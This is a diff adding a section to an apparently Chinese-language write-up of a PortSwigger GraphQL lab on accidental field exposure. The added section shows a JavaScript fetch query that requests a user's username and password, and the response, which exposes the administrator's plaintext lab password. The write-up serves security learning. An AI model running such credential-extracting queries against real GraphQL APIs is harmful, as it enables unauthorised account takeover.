@@ -295,6 +295,44 @@ fetch(`${location.origin}/graphql/v1`, {
 | Document  | https://portswigger.net/web-security/graphql#exploiting-unsanitized-arguments      |
 | Lab       | https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure |
 
+跟上一題一樣，用 [Running a full introspection query](#running-a-full-introspection-query) 的技巧，提取 graphql 的 schema
+
+![graphql-lab-2](../../static/img/graphql-lab-2.svg)
+
+嘗試
+
+```js
+const query = `
+query {
+    getUser(id: 1) {
+        username
+        password
+    }
+}`;
+fetch(`${location.origin}/graphql/v1`, {
+  headers: {
+    "content-type": "application/json",
+  },
+  body: JSON.stringify({
+    query,
+  }),
+  method: "POST",
+});
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "getUser": {
+      "username": "administrator",
+      "password": "vjk7hp3j6kbwz8ivtmqz"
+    }
+  }
+}
+```
+
 ## 參考資料
 
 - https://portswigger.net/web-security/graphql
